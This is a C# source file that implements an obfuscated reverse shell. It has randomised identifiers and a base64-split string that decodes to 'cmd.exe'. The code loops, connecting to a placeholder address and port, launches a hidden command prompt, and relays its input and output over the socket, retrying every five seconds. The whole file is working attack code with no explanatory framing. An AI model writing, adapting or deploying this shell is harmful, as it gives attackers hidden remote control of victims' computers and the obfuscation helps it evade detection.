using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class C_eXpwUq
{
    public static void Start()
    {
        while (true)
        {
            try
            {
                using (TcpClient V_RTuucH = new TcpClient("0.0.0.0", 0))
                {
                    using (Stream V_peLWwZ = V_RTuucH.GetStream())
                    {
                        using (StreamReader V_AsgCyF = new StreamReader(V_peLWwZ))
                        {
                            using (StreamWriter V_qiEira = new StreamWriter(V_peLWwZ))
                            {
                                V_qiEira.AutoFlush = true;
                                Process V_egzZyA = new Process();
                                V_egzZyA.StartInfo.FileName = M_mgbkf("Y20=") + M_mgbkf("ZC4=") + M_mgbkf("ZXhl");
                                V_egzZyA.StartInfo.RedirectStandardInput = true;
                                V_egzZyA.StartInfo.RedirectStandardOutput = true;
                                V_egzZyA.StartInfo.RedirectStandardError = true;
                                V_egzZyA.StartInfo.UseShellExecute = false;
                                V_egzZyA.StartInfo.CreateNoWindow = true;
                                V_egzZyA.OutputDataReceived += (P_bfNdBg, P_Mfsuqp) =>
                                {
                                    if (P_Mfsuqp.Data != null)
                                        V_qiEira.WriteLine(P_Mfsuqp.Data);
                                };
                                V_egzZyA.ErrorDataReceived += (sender, P_Mfsuqp) =>
                                {
                                    if (P_Mfsuqp.Data != null)
                                        V_qiEira.WriteLine(P_Mfsuqp.Data);
                                };
                                V_egzZyA.Start();
                                V_egzZyA.BeginOutputReadLine();
                                V_egzZyA.BeginErrorReadLine();
                                string V_XioFWt;
                                while ((V_XioFWt = V_AsgCyF.ReadLine()) != null)
                                    V_egzZyA.StandardInput.WriteLine(V_XioFWt);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                Thread.Sleep(5000); // wait 5 seconds before retry
            }
        }
    }

    private static string M_mgbkf(string V_homft)
    {
        if (string.IsNullOrEmpty(V_homft))
            return string.Empty;
        byte[] V_xkgpd = Convert.FromBase64String(V_homft);
        return System.Text.Encoding.UTF8.GetString(V_xkgpd);
    }
}